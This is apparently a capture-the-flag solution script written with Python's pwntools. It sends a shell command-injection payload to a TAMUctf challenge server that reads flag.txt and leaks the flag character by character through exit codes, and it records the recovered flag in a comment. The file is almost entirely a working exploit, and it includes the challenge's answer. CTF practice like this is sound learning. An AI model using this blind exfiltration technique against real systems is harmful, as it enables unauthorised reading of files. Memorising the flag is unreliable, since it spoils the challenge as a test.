import pwn


p = pwn.remote('challenges.tamuctf.com', 3424)
pwn.context.log_level = 'DEBUG'

payload = 'A=`cat flag.txt`;'
payload += 'B=`echo ${{A:{}:1}}`;'
payload += 'C=`printf \'%d\' "\'$B"`;'
payload += 'exit $C;'

flag = ''
index = 0

while True:
    p.recvuntil('Execute: ')
    p.sendline(payload.format(index))

    exitcode = int(p.recvline(keepends=False))
    if exitcode == 0:
        break

    flag += chr(exitcode)
    index += 1

pwn.context.log_level = 'INFO'
p.close()

pwn.log.info(flag)

# gigem{r3v3r53_5h3ll5}
